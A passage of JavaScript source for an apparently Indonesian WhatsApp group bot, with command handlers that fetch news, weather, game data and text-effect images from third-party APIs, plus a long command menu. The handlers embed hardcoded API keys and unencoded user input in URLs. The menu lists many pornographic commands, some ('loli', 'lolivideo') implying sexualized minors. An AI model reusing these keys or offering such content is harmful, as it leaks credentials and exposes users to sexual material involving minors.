               ini_txt += `Mana : ${get_result.attr.mana}\n`
               ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
               ini_icon = await getBuffer(get_result.icon)
               await wann.sendMessage(from, ini_icon, image, { quoted: fniv, caption: ini_txt })
               break
//=========================================================
case 'mlstalk':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
               ml_id = args[0]
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=WannOff`)
               reply(get_result.result)
               break
//=========================================================
case 'genshin':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
               hero = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/genshin/${hero}?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Name : ${get_result.title}\n`
               ini_txt += `Intro : ${get_result.intro}\n`
               ini_txt += `Icon : ${get_result.icon}\n`
               ini_icon = await getBuffer(get_result.cover1)
               await wann.sendMessage(from, ini_icon, image, { quoted: fniv, caption: ini_txt })
               ini_voice = await getBuffer(get_result.cv[0].audio[0])
               await wann.sendMessage(from, ini_voice, audio, { quoted: fniv, mimetype: Mimetype.mp4Audio })
               break
//=========================================================
case 'wikipedia':
if (!isGroup) return reply(mess.only.group)
                 if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                 query = args.join(" ")
                 get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=WannOff&query=${query}`)
                 get_result = get_result.result
                 reply(get_result)
                 break
//=========================================================
case 'translate':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} en Tahu Bacem`)
               kode_negara = args[0]
               args.shift()
               ini_txt = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=WannOff&text=${ini_txt}`)
               get_result = get_result.result
               init_txt = `From : ${get_result.from}\n`
               init_txt += `To : ${get_result.to}\n`
               init_txt += `Original : ${get_result.original}\n`
               init_txt += `Translated : ${get_result.translated}\n`
               init_txt += `Pronunciation : ${get_result.pronunciation}\n`
               reply(init_txt)
               break
//=========================================================
case 'newsinfo':
if (!isGroup) return reply(mess.only.group)
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = "Result :\n"
               for (var x of get_result) {
                   ini_txt += `Title : ${x.title}\n`
                   ini_txt += `Author : ${x.author}\n`
                   ini_txt += `Source : ${x.source.name}\n`
                   ini_txt += `Url : ${x.url}\n`
                   ini_txt += `Published : ${x.publishedAt}\n`
                   ini_txt += `Description : ${x.description}\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'cnnindonesia':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Result :\n"
  for (var x of get_result) {
      ini_txt += `Judul : ${x.judul}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Tipe : ${x.tipe}\n`
      ini_txt += `Published : ${x.waktu}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'cnnnasional':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Result :\n"
  for (var x of get_result) {
      ini_txt += `Judul : ${x.judul}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Tipe : ${x.tipe}\n`
      ini_txt += `Published : ${x.waktu}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'cnninternasional':
if (!isGroup) return reply(mess.only.group)
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = "Result :\n"
               for (var x of get_result) {
                   ini_txt += `Judul : ${x.judul}\n`
                   ini_txt += `Link : ${x.link}\n`
                   ini_txt += `Tipe : ${x.tipe}\n`
                   ini_txt += `Published : ${x.waktu}\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'infogempa':
if (!isGroup) return reply(mess.only.group)
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Lokasi : ${get_result.lokasi}\n`
               ini_txt += `Waktu : ${get_result.waktu}\n`
               ini_txt += `Potensi : ${get_result.potensi}\n`
               ini_txt += `Magnitude : ${get_result.magnitude}\n`
               ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
               ini_txt += `Koordinat : ${get_result.koordinat}`
               get_buffer = await getBuffer(get_result.map)
               await wann.sendMessage(from, get_buffer, image, { quoted: fniv, caption: ini_txt })
               break
//=========================================================
case 'lirik':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
               query = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=WannOff&query=${query}`)
               reply(get_result.result)
               break
//=========================================================
case 'cuaca':
if (!isGroup) return reply(mess.only.group)
  if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
  daerah = args[0]
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = `Tempat : ${get_result.tempat}\n`
  ini_txt += `Cuaca : ${get_result.cuaca}\n`
  ini_txt += `Angin : ${get_result.angin}\n`
  ini_txt += `Description : ${get_result.description}\n`
  ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
  ini_txt += `Suhu : ${get_result.suhu}\n`
  ini_txt += `Udara : ${get_result.udara}\n`
  ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
  await wann.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: fniv })
  reply(ini_txt)
  break
//=========================================================
case 'kodepos':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
               daerah = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=WannOff&query=${daerah}`)
               get_result = get_result.result[0]
               ini_txt = `Provinsi : ${get_result.province}\n`
               ini_txt += `Kabupaten : ${get_result.city}\n`
               ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
               ini_txt += `Kelurahan : ${get_result.urban}\n`
               ini_txt += `Kode Pos : ${get_result.postalcode}`
               reply(ini_txt)
               break
//========================================================= 
case 'indbeasiswa':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = 'Info Beasiswa :\n'
  for (var x of get_result) {
      ini_txt += `Title : ${x.title}\n`
      ini_txt += `Link : ${x.link}\n\n`
  }
  reply(ini_txt)
  break                  
//=========================================================
case 'hoax':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = 'Info Hoax :\n'
  for (var x of get_result) {
      ini_txt += `Title : ${x.title}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Posted : ${x.posted}\n`
      ini_txt += `Description : ${x.desc}\n\n`
  }
  reply(ini_txt)
  break
case 'allmenu':
menu = `❏ 「 \`\`\`MENU ALL\`\`\` 」
├────────────────────
├ ${prefix}infogempa
├ ${prefix}herolist
├ ${prefix}herodetail [ _hero_ ]
├ ${prefix}google [ _search_ ]
├ ${prefix}gimage [ _search_ ]
├ ${prefix}wiki [ _search_ ]
├ ${prefix}mediafire [ _link_ ]
├ ${prefix}ytsearch [ _judul_ ]
├ ${prefix}ytmp4 [ _link yt_ ]
├ ${prefix}ytmp3 [ _link yt_ ]
├ ${prefix}play [ _judul lagu_ ]
├ ${prefix}video [ _judul video_ ]
├ ${prefix}tinyurl [ _link_ ]
├ ${prefix}fetch [ _link_ ]
├ ${prefix}igdl [ _link_ ]
├ ${prefix}tiktokdl [ _link_ ]
├ ${prefix}pinterest [ _search_ ]
├ ${prefix}lirik [ _judul_ ]
├ ${prefix}tourl [ _reply image/video_ ]
├ ${prefix}resepmasakan [ _judul_ ]
├ ${prefix}artimimpi [ _teks_ ]
├ ${prefix}bilangangka [ _angka_ ]
├ ${prefix}kalkulator [ _angka_ ]
├ ${prefix}fancytext [ _teks_ ]
├ ${prefix}githubstalk [ _username_ ]
├ ${prefix}translate [ _teks kodebhs_ ]
└ ${prefix}ss [ _link_ ]
├  ${prefix}groupsetting
├  ${prefix}antilink
├  ${prefix}antibitly
├  ${prefix}antivirtex
├  ${prefix}antihidetag
├  ${prefix}group
├  ${prefix}opentime
├  ${prefix}closetime
├  ${prefix}afk *ALASAN*
├  ${prefix}ceksewa
├  ${prefix}kickall
├  ${prefix}infogrup
├  ${prefix}promote
├  ${prefix}demote
├  ${prefix}listonline
├  ${prefix}tagall *TEKS*
├  ${prefix}leave
├  ${prefix}kick *REPLY*
├  ${prefix}add *62xxxx*
├  ${prefix}setgrupname
├  ${prefix}setppgrup
├  ${prefix}setdesc
├  ${prefix}sider *REPLY*
├  ${prefix}hidetag *REPLY/TEKS*
├  ${prefix}fitnah
├ ${prefix}blackpink text
├ ${prefix}neon text
├ ${prefix}greenneon text
├ ${prefix}advanceglow text
├ ${prefix}futureneon text
├ ${prefix}sandwriting text
├ ${prefix}sandsummer text
├ ${prefix}sandengraved text
├ ${prefix}metaldark text
├ ${prefix}neonlight text
├ ${prefix}holographic text
├ ${prefix}text1917 text
├ ${prefix}minion text
├ ${prefix}deluxesilver text
├ ${prefix}newyearcard text
├ ${prefix}bloodfrosted text
├ ${prefix}halloween text
├ ${prefix}jokerlogo text
├ ${prefix}fireworksparkle text
├ ${prefix}natureleaves text
├ ${prefix}bokeh text
├ ${prefix}toxic text
├ ${prefix}strawberry text
├ ${prefix}box3d text
├ ${prefix}roadwarning text
├ ${prefix}breakwall text
├ ${prefix}icecold text
├ ${prefix}luxury text
├ ${prefix}cloud text
├ ${prefix}summersand text
├ ${prefix}horrorblood text
├ ${prefix}thunder text
├ ${prefix}pornhub text1 text2
├ ${prefix}glitch text1 text2
├ ${prefix}avenger text1 text2
├ ${prefix}space text1 text2
├ ${prefix}ninjalogo text1 text2
├ ${prefix}marvelstudio text1 text2
├ ${prefix}lionlogo text1 text2
├ ${prefix}wolflogo text1 text2
├ ${prefix}steel3d text1 text2
├ ${prefix}wallgravity text1 text2
├ ${prefix}chiisaihentai
├ ${prefix}trap
├ ${prefix}blowjob
├ ${prefix}yaoi
├ ${prefix}ecchi
├ ${prefix}hentai
├ ${prefix}ahegao
├ ${prefix}hololewd
├ ${prefix}sideoppai
├ ${prefix}animefeets
├ ${prefix}animebooty
├ ${prefix}animethighss
├ ${prefix}hentaiparadise
├ ${prefix}animearmpits
├ ${prefix}hentaifemdom
├ ${prefix}lewdanimegirls
├ ${prefix}biganimetiddies
├ ${prefix}animebellybutton
├ ${prefix}hentai4everyone
├ ${prefix}bj
├ ${prefix}ero
├ ${prefix}ppcp
├ ${prefix}cum
├ ${prefix}feet
├ ${prefix}yuri
├ ${prefix}trap
├ ${prefix}lewd
├ ${prefix}feed
├ ${prefix}eron
├ ${prefix}solo
├ ${prefix}gasm
├ ${prefix}poke
├ ${prefix}anal
├ ${prefix}holo
├ ${prefix}tits
├ ${prefix}kuni
├ ${prefix}kiss
├ ${prefix}erok
├ ${prefix}smug
├ ${prefix}baka
├ ${prefix}solog
├ ${prefix}feetg
├ ${prefix}lewdk
├ ${prefix}waifu
├ ${prefix}pussy
├ ${prefix}femdom
├ ${prefix}cuddle
├ ${prefix}hentai
├ ${prefix}eroyuri
├ ${prefix}cum_jpg
├ ${prefix}blowjob
├ ${prefix}erofeet
├ ${prefix}holoero
├ ${prefix}classic
├ ${prefix}erokemo
├ ${prefix}fox_girl
├ ${prefix}futanari
├ ${prefix}lewdkemo
├ ${prefix}wallpaper
├ ${prefix}pussy_jpg
├ ${prefix}kemonomimi
├ ${prefix}nsfw_avatar
├ ${prefix}ngif
├ ${prefix}nsfw_neko_gif
├ ${prefix}random_hentai_gif
├ ${prefix}shadow text
├ ${prefix}cup text
├ ${prefix}cup1 text
├ ${prefix}romance text
├ ${prefix}smoke text
├ ${prefix}burnpaper text
├ ${prefix}lovemessage text
├ ${prefix}undergrass text
├ ${prefix}love text
├ ${prefix}coffe text
├ ${prefix}woodheart text
├ ${prefix}woodenboard text
├ ${prefix}summer3d text
├ ${prefix}wolfmetal text
├ ${prefix}nature3d text
├ ${prefix}underwater text
├ ${prefix}golderrose text
├ ${prefix}summernature text
├ ${prefix}letterleaves text
├ ${prefix}glowingneon text
├ ${prefix}fallleaves text
├ ${prefix}flamming text
├ ${prefix}harrypotter text
├ ${prefix}carvedwood text
├ ${prefix}tiktok text1 text2
├ ${prefix}arcade8bit text1 text2
├ ${prefix}battlefield4 text1 text2
├ ${prefix}pubg text1 text2
├ ${prefix}wetglass text
├ ${prefix}multicolor3d text
├ ${prefix}watercolor text
├ ${prefix}luxurygold text
├ ${prefix}galaxywallpaper text
├ ${prefix}lighttext text
├ ${prefix}beautifulflower text
├ ${prefix}puppycute text
├ ${prefix}royaltext text
├ ${prefix}heartshaped text
├ ${prefix}birthdaycake text
├ ${prefix}galaxystyle text
├ ${prefix}hologram3d text
├ ${prefix}greenneon text
├ ${prefix}glossychrome text
├ ${prefix}greenbush text
├ ${prefix}metallogo text
├ ${prefix}noeltext text
├ ${prefix}glittergold text
├ ${prefix}textcake text
├ ${prefix}starsnight text
├ ${prefix}wooden3d text
├ ${prefix}textbyname text
├ ${prefix}writegalacy text
├ ${prefix}galaxybat text
├ ${prefix}snow3d text
├ ${prefix}birthdayday text
├ ${prefix}goldplaybutton text
├ ${prefix}silverplaybutton text
├ ${prefix}freefire text
├ ${prefix}darkjoke
├ ${prefix}meme
├ ${prefix}joke
├ ${prefix}wasted
├ ${prefix}hitler
├ ${prefix}wanted
├ ${prefix}greyscale
├ ${prefix}trash
├ ${prefix}circle
├ ${prefix}blur
├ ${prefix}tinyurl
├ ${prefix}cuttly
├ ${prefix}affect
├ ${prefix}picture
├ ${prefix}artinama *nama kamu*
├ ${prefix}artimimpi
├ ${prefix}jodoh
├ ${prefix}tebakumur *nama kamu*
├ ${prefix}tebakgender *nama kamu*
├ ${prefix}drakorongoing
├ ${prefix}lk21 query
├ ${prefix}wattpad url_wattpad
├ ${prefix}wattpadsearch query
├ ${prefix}cerpen
├ ${prefix}ceritahoror
├ ${prefix}quotes
├ ${prefix}quotesdilan
├ ${prefix}quotesanime
├ ${prefix}quotesimage
├ ${prefix}faktaunik
├ ${prefix}katabijak
├ ${prefix}pantun
├ ${prefix}bucin
├ ${prefix}randomnama
├ ${prefix}darkjokes
├ ${prefix}memeindo
├ ${prefix}katailham
├ ${prefix}katajago
├ ${prefix}cekbapak
├  ${prefix}antidelete
├  ${prefix}anticall
├  ${prefix}antivo
├  ${prefix}bc *teks*
├  ${prefix}term
├  ${prefix}eval
├  ${prefix}reset
├  ${prefix}clearall
├  ${prefix}leaveall
├  ${prefix}upswteks
├  ${prefix}upswimage
├  ${prefix}upswsticker
├  ${prefix}upswgif
├  ${prefix}upswaudio
├  ${prefix}upswvoice
├  ${prefix}upswvideo
├  ${prefix}leaveall
├  ${prefix}join *link gc*
├  ${prefix}shutdown
├  ${prefix}getquoted
├  ${prefix}addupdate *fiturnya*
├  ${prefix}exif *nama|author*
├  ${prefix}sewa add/del *waktunya*
├  ${prefix}premium add @tag|nomor
├  ${prefix}premium del @tag|nomor
├  ${prefix}hacked *TEKSNYA*
├  ${prefix}boomtext *TEKSNYA*
├  ${prefix}loli
├  ${prefix}manga
├  ${prefix}anime 
├  ${prefix}lolivideo
├  ${prefix}husbu
├  ${prefix}waifu
├  ${prefix}milf
├  ${prefix}neko
├  ${prefix}kanna
├  ${prefix}sagiri
├  ${prefix}hentai
├  ${prefix}cosplay
├  ${prefix}wallnime
├  ${prefix}kusonime
├  ${prefix}megumin
├  ${prefix}otakudesu
├  ${prefix}otaku
├  ${prefix}doujindesu
├  ${prefix}storyanime
├  ${prefix}nakanomiku
├  ${prefix}nakanoikyy
├  ${prefix}nakanoitsuki
├  ${prefix}otakuongoing
├  ${prefix}nhentai *code*
├  ${prefix}nekopoi *link*
├  ${prefix}nekopoi3d
├  ${prefix}nekopoicosplay
├  ${prefix}nekopoisearch
├  ${prefix}fb 
├  ${prefix}igdl 
├  ${prefix}igdl2 
├  ${prefix}twitter 
├  ${prefix}tiktok 
├  ${prefix}play 
├  ${prefix}ythd 
├  ${prefix}ytmp3 
├  ${prefix}ytmp4 
├  ${prefix}soundcloud 
├  ${prefix}tiktoknowm 
├  ${prefix}tiktokaudio
├  ${prefix}mediafire 
├  ${prefix}nhentaipdf *code*
├  ${prefix}brainly *query*
├  ${prefix}shopee *product*
├  ${prefix}playstore *query*
├  ${prefix}ssweb *query*
├  ${prefix}google *query*
├  ${prefix}image *query*
├  ${prefix}pinterest *query*
├  ${prefix}nulis *teks*
├  ${prefix}nulis *teks*
├  ${prefix}iguser *ussername*
├  ${prefix}igstalk *username*
├  ${prefix}githubstalk *username*
├  ${prefix}tiktokstalk *ussername*
├  ${prefix}img2url *reply foto*
├  ${prefix}ytsearch *query*
├  ${prefix}slot
├  ${prefix}limitgame
├  ${prefix}gelud @tag
├  ${prefix}tictactoe @tag
├  ${prefix}siapaaku
├  ${prefix}family100
├  ${prefix}kuismath
├  ${prefix}asahotak
├  ${prefix}tebaklirik
├  ${prefix}tebaklagu
├  ${prefix}tebakkata
├  ${prefix}susunkata
├  ${prefix}kimiakuis
├  ${prefix}caklontong
├  ${prefix}tebakjenaka
├  ${prefix}tebakanime
├  ${prefix}tebaktebakan
├  ${prefix}tebakgambar
├  ${prefix}tebakbendera
├  ${prefix}suit *batu/kertas/gunting*
├  ${prefix}suit2
├  ${prefix}dadu
├  ${prefix}amongus *TEKS*
├  ${prefix}doge
├  ${prefix}toimg
├  ${prefix}patrick
├  ${prefix}garwgura
├  ${prefix}ttg *teks*
├  ${prefix}ttp *teks
├  ${prefix}ttp2 *teks*
├  ${prefix}ttp3 *teks*
├  ${prefix}ttp4 *teks*
├  ${prefix}attp *teks*
├  ${prefix}stickeranime
├  ${prefix}semoji *emoji*
├  ${prefix}sticker *reply foto/video*
├  ${prefix}smeme *teks|teks*
├  ${prefix}swm *pack|author*
├  ${prefix}take *pack|author* 
├  ${prefix}tovideo *reply sgif*

 *FUN MENU*
├  ${prefix}mining
├  ${prefix}togel
├  ${prefix}cekwatak
├  ${prefix}cekmati [nama]
├  ${prefix}wangy [nama]
├  ${prefix}citacita
├  ${prefix}toxic
├  ${prefix}tod
├  ${prefix}truth
├  ${prefix}dare
├  ${prefix}apakah
├  ${prefix}bisakah
├  ${prefix}kapankah
├  ${prefix}rate
├  ${prefix}jadian
├  ${prefix}cantik
├  ${prefix}ganteng
├  ${prefix}beban
├  ${prefix}babi
├  ${prefix}ngentot
├  ${prefix}gantengcek
├  ${prefix}cantikcek
├  ${prefix}goblokcek
├  ${prefix}gaycek
├  ${prefix}sangecek
├  ${prefix}cekbapack
├  ${prefix}hbd
├  ${prefix}hilih *teks*
├  ${prefix}alay
├  ${prefix}hbk
├  ${prefix}bpurba
├  ${prefix}infocorona
├  ${prefix}cekkalender
├  ${prefix}cekramadhan
├  ${prefix}update
├  ${prefix}level
├  ${prefix}rules
├  ${prefix}profile
├  ${prefix}waktu
├  ${prefix}botstat
├  ${prefix}sewabot
├  ${prefix}listsewa
├  ${prefix}owner
├  ${prefix}ping
├  ${prefix}runtime
├  ${prefix}donasi
├  ${prefix}leaderboard
├  ${prefix}cekpremium
├  ${prefix}listpremium
├  ${prefix}sourcecode
├  ${prefix}bugreport *keluhan*
├  ${prefix}listsurah
├  ${prefix}alquran
├  ${prefix}alquranaudio
├  ${prefix}asmaulhusna
├  ${prefix}kisahnabi
├  ${prefix}jadwalsholat
├  ${prefix}ayatkursi
├  ${prefix}bacaanshalat
├  ${prefix}doaharian
├  ${prefix}slow
├  ${prefix}tupai
├  ${prefix}bass
├  ${prefix}robot
├  ${prefix}balik
├  ${prefix}gemuk
├  ${prefix}fast
├  ${prefix}imut
├  ${prefix}hode
├  ${prefix}nightcore
├  ${prefix}tts *KODE BAHASA*
├  ${prefix}addvn
├  ${prefix}getvn
├  ${prefix}listvn
├  ${prefix}addsticker
├  ${prefix}getsticker
├  ${prefix}liststicker
├  ${prefix}addimage
├  ${prefix}getimage
├  ${prefix}listimage
├  ${prefix}addvideo
├  ${prefix}getvideo
├  ${prefix}listvideo
├  ${prefix}addcmd
├  ${prefix}delcmd
├  ${prefix}listcmd
`
katalog(menu)
break
// photooxy
//2 text
case 'captain_as':
case 'smoke':
case 'tiktok2': 
case 'arcade':
case 'battlefield':
case 'pubg':
if (args.length < 1) return reply(mess.tahta(prefix, command))
 m = q
 m1 = m.split("|")[0];
 m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`http://api-alphabot.herokuapp.com/photooxy/${command}?apikey=Alphabot&text=${m1}&text2=${m2}`)
wann.sendMessage(from, photooxy, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break              
    // 1 text
case 'shadow':
case 'cname':
case 'romantic':
case 'burnpaper':
case 'funnycup':
case 'love':
case 'undergrass':          
case 'heart':
case 'coffeecup':
case 'wood':          
case 'flower':         
case 'wooden': 
case '3dsummer':
case 'wolf_metal':
case '3dnature':
case 'underwater':          
case 'goldenrose':
case 'vector':
case 'typography':
case 'typography2': 
case 'underfall':  
case 'smokyneon': 
case 'rainbow': 
case 'graffiti':
case 'camouflage':
case '3dglowing':          
case 'vintage':
case 'honey': 
case 'whitecube':
case 'avatar': 
case 'glowrainbow':
case 'nightsky':
case 'fur':
case 'flaming':          
case 'crisp':
case 'embroidery':
case 'bcake':          
case '3dligth':
case 'metallic': 
case 'striking':
case 'watermelon':         
case 'butterfly':
case 'harry':
case 'glowneon':
case 'coffecup2':          
case 'luxury': 
case 'cemetery':
case 'woodblock':
case 'sweet':
case 'simple':
case 'bevel':
case 'underflower':         
case 'underflower2':
if (args.length < 1) return reply(`text mana broh?contoh ${prefix + command} ${pushname}`)
q = args.join(' ')
let photooxy2 = await getBuffer(`https://api-alphabot.herokuapp.com/api/photooxy/${command}?text=${q}&apikey=Alphabot`)
wann.sendMessage(from, photooxy2, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break
      //2 TEXT
case 'halloween2':
case 'horror':
case 'game8bit':
case 'layered':
case 'glitch2':
case 'coolg':
case 'coolwg':
case 'realistic':
case 'space3d':
case 'gtiktok':
case 'stone':
case 'marvel':
case 'marvel2':
case 'pornhub':
case 'avengers':
case 'metalr':
case 'metalg':
case 'metalg2':
case 'halloween2':
case 'lion':
case 'wolf_bw':
case 'wolf_g':
case 'ninja':
case '3dsteel':
case 'horror2':
case 'lava':
case 'bagel':
if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} Wann|OFC`)
 m = q
 m1 = m.split("|")[0];
 m2 = m.split("|")[1]; 
let textpro = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/${command}?text=${m1}&text2=${m2}&apikey=Alphabot`)
wann.sendMessage(from, textpro, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break
//1 TEXT  
case 'blackpink':
case 'rainbow2':
case 'water_pipe':
case 'halloween':
case 'sketch':
case 'sircuit':
case 'discovery':
case 'metallic2':
case 'fiction':
case 'demon':
case 'transformer':
case 'berry':
case 'thunder':
case 'magma':
case '3dstone':
case 'neon':
case 'glitch':
case 'harry_potter':
case 'embossed':
case 'broken':
case 'papercut':
case 'gradient':
case 'glossy':
case 'watercolor':
case 'multicolor':
case 'neon_devil':
case 'underwater':
case 'bear':
case 'wonderfulg':
case 'christmas':
case 'neon_light':
case 'snow':
case 'cloudsky':
case 'luxury2':
case 'gradient2':
case 'summer':
case 'writing':
case 'engraved':
case 'summery':
case '3dglue':
case 'metaldark':
case 'neonlight':
case 'oscar':
case 'minion':
case 'holographic':
case 'purple':
case 'glossyb':
case 'deluxe2':
case 'glossyc':
case 'fabric':
case 'neonc':
case 'newyear':
case 'newyear2':
case 'metals':
case 'xmas':
case 'blood':
case 'darkg':
case 'joker':
case 'wicker':
case 'natural':
case 'firework':
case 'skeleton':
case 'balloon':
case 'balloon2':
case 'balloon3':
case 'balloon4':
case 'balloon5':
case 'balloon6':
case 'balloon7':
case 'steel':
case 'gloss':
case 'denim':
case 'decorate':
case 'decorate2':
case 'peridot':
case 'rock':
case 'glass':
case 'glass2':
case 'glass3':
case 'glass4':
case 'glass5':
case 'glass6':
case 'glass7':
case 'glass8':
case 'captain_as2':
case 'robot':
case 'equalizer':
case 'toxic':
case 'sparkling':
case 'sparkling2':
case 'sparkling3':
case 'sparkling4':
case 'sparkling5':
case 'sparkling6':
case 'sparkling7':
case 'decorative':
case 'chocolate':
case 'strawberry':
case 'koifish':
case 'bread':
case 'matrix':
case 'blood2':
case 'neonligth2':
case 'thunder2':
case '3dbox':
case 'neon2':
case 'roadw':
case 'bokeh':
case 'gneon':
case 'advanced':
case 'dropwater':
case 'wall':
case 'chrismast':
case 'honey':
case 'drug':
case 'marble':
case 'marble2':
case 'ice':
case 'juice':
case 'rusty':
case 'abstra':
case 'biscuit':
case 'wood':
case 'scifi':
case 'metalr':
case 'purpleg':
case 'shiny': 
case 'jewelry':
case 'jewelry2':
case 'jewelry3':
case 'jewelry4':
case 'jewelry5':
case 'jewelry6':
case 'jewelry7':
case 'jewelry8':
case 'metalh':
case 'golden':
case 'glitter':
case 'glitter2':
case 'glitter3':
case 'glitter4':
case 'glitter5':
case 'glitter6':
case 'glitter7':
case 'metale':
case 'carbon':
case 'candy':
case 'metalb':
case 'gemb':
case '3dchrome':
case 'metalb2':
case 'metalg':
if (args.length < 1) return reply(`text mana broh?contoh ${prefix + command} ${pushname}`)
q = args.join(' ')
let textpro2 = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/${command}?text=${q}&apikey=Alphabot`)
wann.sendMessage(from, textpro2, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break
case 'cekapikey':
if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
q = args.join(' ')
 anu = await fetchJson(`http://Api.lolhuman.xyz/api/checkapikey?apikey=${q}`)
  teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = http://Api.lolhuman.xyz`
                katalog(teks)
case 'cyber':
                //[❗] Fix Eror By Wann
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/anonymhacker?apikey=WannOff&text=${addit}`)
				wann.sendMessage(from, aditty, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break

case 'logogaming':
                //[❗] Fix Eror By Wann
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=WannOff&text=${addit}`)
				wann.sendMessage(from, aditty, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break

case 'lightext':
                //[❗] Fix Eror By Wann
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/lighttext?apikey=WannOff&text=${addit}`)
				 wann.sendMessage(from, aditty, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break
case 'tololserti':
                //[❗] Fix Eror By Wann
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=WannOff&name=${addit}`)
				wann.sendMessage(from, aditty, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break

case 'love':
if (isBanned) return reply(mess.ban)
if (isBanchat) return
if(!q)return reply(`Example : ${prefix + command} WANNN`)
reply(mess.wait)
alam = await fetchJson(`https://api.lolhuman.xyz/api/photooxy1/love?apikey=apikey=WannOff&text=${q}`)
alam2 = await getBuffer(alam.result.url)
wann.sendMessage(from, alam2, image, {thumbnail: Buffer.alloc(0), caption: `Follow @Wann`, quoted : fmen})
				break
//Bokep
  //========================================================= 
  case 'bokep1':	
